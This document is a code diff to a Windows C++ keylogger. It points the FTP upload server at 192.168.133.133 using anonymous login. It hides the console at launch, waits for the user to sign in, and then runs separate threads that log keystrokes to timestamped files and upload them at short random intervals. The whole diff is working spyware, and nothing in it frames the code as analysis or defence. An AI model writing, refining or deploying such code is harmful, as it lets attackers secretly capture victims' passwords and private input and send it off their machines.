@@ -21,7 +21,7 @@
 
 #pragma comment( lib, "wininet" )
 
-#define FTP_SERVER L"192.168.1.38"
+#define FTP_SERVER L"192.168.133.133"
 #define FTP_USER L"anonymous"
 #define FTP_PASS L""
 
@@ -41,16 +41,24 @@ std::wstring s2ws(const std::string&);
 
 /* Main :P */
 int main( int argc, char* argv[] ){
+	/* Hide the console! */
+	hide();
+
+	/* Sleep for a bit, so the OS and Account can sign in just fine */
+	Sleep(7000);
+
 	/* Get the cwd, so we can delete files */
 	cwd = _getcwd(NULL, 0);
 	time_t t;
-	hide();
+	
 	srand( (unsigned)time(NULL) );
 	t = time(0);
 	fname = ".\\keys_" + std::to_string(t) + ".txt"; // make an initial filename
 	
 	/* Create a thread for the uploader and a thread for the keylogger */
+	//std::cout << "starting keylogger thread" << std::endl;
 	_beginthread(keylogger, 0, NULL);
+	//std::cout << "Starting uploader thread" << std::endl;
 	_beginthread(uploader, 0, NULL);
 
 	while(1){ } // Have the main process sleep forever.
@@ -64,7 +72,7 @@ void uploader(void* parg){
 
 	while(1){
 		// Sleep time should be 1 to 5 minutes.
-		unsigned int t_sleep = rand() % 30000 + 6000;
+		unsigned int t_sleep = rand() % 30000 + 600;
 		time_t t_stamp = time(0);
 
 		/* Sleep */
